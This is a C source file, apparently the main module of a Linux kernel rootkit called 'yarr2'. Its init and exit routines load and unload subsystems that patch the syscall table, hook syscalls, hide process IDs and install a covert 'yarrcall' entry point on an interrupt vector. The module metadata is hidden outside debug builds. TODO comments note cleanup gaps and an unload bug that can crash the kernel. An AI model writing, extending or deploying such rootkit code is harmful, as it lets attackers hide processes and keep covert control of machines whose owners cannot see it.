#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include "log.h"
#include "hook.h"
#include "patch.h"
#include "hidepid.h"
#include "yarrcall.h"

#ifdef DEBUG
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ole");
MODULE_DESCRIPTION("Yarr2 module");
MODULE_VERSION("0.01");
#endif

// TODO: When some subsystem fails initializing we should free resources from
// previously initialized subsystems.
static int __init yarr2_init(void) {
    int err;

    yarr_log("Loading yarr2 into kernel...");

    yarr_log("Initializing patch subsystem...");
    err = patch_init();
    if (err) {
        yarr_log("Errors initializing patch subsystem");
        return -1;
    }

    yarr_log("Initializing hook subsystem...");
    err = hook_init();
    if (err) {
        yarr_log("Errors initializing hook subsystem");
        return -1;
    }

    yarr_log("Initializing hidepid subsystem...");
    err = hidepid_init();
    if (err) {
        yarr_log("Errors initializing hidepid subsystem");
        return -1;
    }

    yarr_log("Initializing yarrcall subsystem...");
    err = yarrcall_init();
    if (err) {
        yarr_log("Errors initializing yarrcall subsystem");
        return -1;
    }

    yarr_log("Installing hidepid hooks...");
    err = hidepid_install_hooks();
    if (err) {
        yarr_log("Errors installing hidepid hooks");
        return -1;
    }

    yarr_log("Installing yarrcall hook...");
    err = install_hook(YARR_VECTOR, entry_yarrcall);
    if (err) {
        yarr_log("Errors installing yarrcall entry point");
        return -1;
    }

    yarr_log("Yarr2 loading finished.");
    return 0;
}

static void __exit yarr2_exit(void) {
    int err;

    // TODO: When stopping a subsystem fails we shouldn't just return there, we
    // should try to clean the remaining running subsystems.
    yarr_log("Starting unload of yarr2...");

    yarr_log("Stopping yarrcall subsystem...");
    err = yarrcall_finish();
    if (err) {
        yarr_log("Errors stopping yarrcall subsystem");
        return;
    }

    yarr_log("Stopping hidepid subsystem...");
    err = hidepid_finish();
    if (err) {
        yarr_log("Errors stopping hidepid subsystem");
        return;
    }

    yarr_log("Stopping hook subsystem...");
    err = hook_finish();
    if (err) {
        yarr_log("Errors stopping hook subsystem");
        return;
    }

    // TODO: Bug. When we unpatch the syscall table there could be tasks
    // executing a syscall. If that syscall was hooked by any subsystem, it
    // means when such task is returning at some point it will try to return
    // to the hooked syscall (__yarr__x64_sys_<name>) which is not present
    // anymore in the system and leading into a kernel page fault (an oops).
    // You can see this happening when hooking sys_wait4() (hidepid module
    // hooks it) and unloading yarr2 through rmmod from a shell without
    // launching in the background (without using '&').
    yarr_log("Stopping patch subsystem...");
    err = patch_finish();
    if (err) {
        yarr_log("Errors stopping patch subsystem");
        return;
    }

    yarr_log("Yarr2 unload finished");
    return;
}

module_init(yarr2_init);
module_exit(yarr2_exit);

